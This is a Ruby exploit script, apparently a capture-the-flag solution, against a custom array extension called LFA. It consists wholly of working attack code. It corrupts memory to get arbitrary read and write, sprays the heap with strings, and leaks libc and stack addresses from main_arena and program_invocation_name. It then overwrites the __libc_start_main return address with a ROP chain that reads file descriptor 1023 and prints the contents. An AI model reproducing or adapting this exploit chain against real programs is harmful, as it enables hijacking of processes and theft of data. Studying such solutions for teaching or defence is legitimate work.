require './LFA'

syscall 1, 1, "hello\n", 6

$lol = []
$arr = LFA.new
$arr[0] = 0xfefefef
$arr[0x7fff0000] = 10
$arr.remove(0x7fff0000)
spray_size = 0x100000 
for n in 0..3*spray_size
	$lol << "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ" + "A" * (n % 3)
end

def qword(hi, lo)
	lo = (1 << 32) + lo if lo < 0
	return (hi << 32) + lo
end

def is_heap_ptr(v)
	return false if !(v & 0xff0000000000)
	return false if ((v & 0xffff0000000000) >> 40) >= 0x70
	return true
end

def read_qword(i)
	return qword($arr[i+1], $arr[i])
end

def two_complement(v)
	return v if v < 0x80000000
	return v - (2**32)
end
i = -2
indices = []
string_ptrs = []
while true
	i += 2
	qw = read_qword(i)
	next if !qw.between?(0x24,0x26)

	# check if next next qword is same value
	qw2 = read_qword(i + 4)
	next if qw2 != qw

	p1 = read_qword(i-2)
	p2 = read_qword(i+2)

	next if !is_heap_ptr(p1) or !is_heap_ptr(p2)

	indices << (i + 2)
	string_ptrs << p2
	break if indices.size > 1000
end

indices.each_with_index do |e, i| 
	$arr[e] = two_complement((string_ptrs[i] & 0xffffff00))
end


$faulty_idx=-1
$lol.each_with_index do |e, i| 
	if !e.include? "AAAA"
		puts "[*] Got faulty string"
		$faulty_idx = i
		break
	end
end

abort if $faulty_idx == -1

$exploit_idx = -1
indices.each_with_index do |e, i| 
	v = two_complement(string_ptrs[i] & 0xffffffff)
	$arr[e] = v
	if $lol[$faulty_idx].include? "AAAA"
		$exploit_idx = e
		break
	end
end

def read_mem(addr)
	$arr[$exploit_idx] = two_complement(addr & 0xffffffff)
	$arr[$exploit_idx + 1] = two_complement(addr >> 32)
	return $lol[$faulty_idx]
end

i = -2
lib_indices = []
lib_ptrs = []
while true
	i += 2
	qw = read_qword(i)
	next if (qw  >> 40) < 0x70 or (qw>>40)>= 0x80
	next if (qw >> 24) & 0xff == 0
	next if (qw >> 32) & 0xff == 0
	lib_ptrs << qw
	lib_indices << i
	break if lib_ptrs.size > 150 or i > 0x30000
end

def all_ascii_byte(v)
	while v != 0
		if !((v & 0xff).between?(0x20,0x7f)) and (v & 0xff) != 0
			return false
		end
		v >>= 8
	end
	return true
end

lfa_leak = nil
target = 0
main_arena = 0
lib_ptrs.each do |v|
  puts "[*] ptr 0x%x" % v
	if ((v - 0x3dac78) & 0xfff) == 0
		main_arena = v
		break
	end
end

puts "[*] let's pwn"

puts "[*] MAIN ARENA ADDRESS 0x%x" % main_arena 
exit(1) if main_arena == 0
libc_base = main_arena - 0x3dac78
puts "[*] LIBC BASE 0x%x" % libc_base 
program_invocation_name = libc_base + 0x3db4d8

stack = read_mem(program_invocation_name)
stack = stack[0,8].unpack("Q")[0]
stack = stack + (8 - (stack %8)) # align on qword boundary
puts "[+] STACK 0x%x" % stack 

backup_stack = stack

needle = libc_base + 0x211c1

while true
	stack -= 8
	tmp = read_mem(stack)[0,8].unpack("Q")[0]
	if tmp == needle
		puts "[*] GOT LIBC START MAIN"
		break
	end
end

puts "[*] LIBC START MAIN RETURN ADDRESS 0x%x" % stack 
def write_mem(addr, v)
	$arr[$exploit_idx] = two_complement(addr & 0xffffffff)
	$arr[$exploit_idx + 1] = two_complement(addr >> 32)
	$lol[$faulty_idx][0..7] = [v].pack("Q")
end

syscall_ret = libc_base + 0xc7f75
pop_rdi = libc_base + 0x20b8b
pop_rsi = libc_base + 0x20a0b
pop_rdx = libc_base + 0x1b96
pop_rax = libc_base + 0x234c3

write_mem(backup_stack, backup_stack + 16) # iovec structure
write_mem(backup_stack + 8, 0x44)

# readv(1023, iovec, 1)
write_mem(stack, pop_rdi)
write_mem(stack + 8, 0x00000000000003ff) # fd
write_mem(stack + 16, pop_rsi)
write_mem(stack + 24, backup_stack) # iovec
write_mem(stack + 32, pop_rdx)
write_mem(stack + 40, 1) # iocnt
write_mem(stack + 48, pop_rax)
write_mem(stack + 56, 19) # readv
write_mem(stack + 64, syscall_ret)

stack += 72

write_mem(stack, pop_rdi)
write_mem(stack + 8, 1) # fd
write_mem(stack + 16, pop_rsi)
write_mem(stack + 24, backup_stack + 16) # buf
write_mem(stack + 32, pop_rdx)
write_mem(stack + 40, 34) # nbyte
write_mem(stack + 48, pop_rax)
write_mem(stack + 56, 1) # write
write_mem(stack + 64, syscall_ret)

stack += 72

write_mem(stack, pop_rdi)
write_mem(stack + 8, 0) # statuscode
write_mem(stack + 16, pop_rax)
write_mem(stack + 24, 60) # exit
write_mem(stack + 32, syscall_ret)



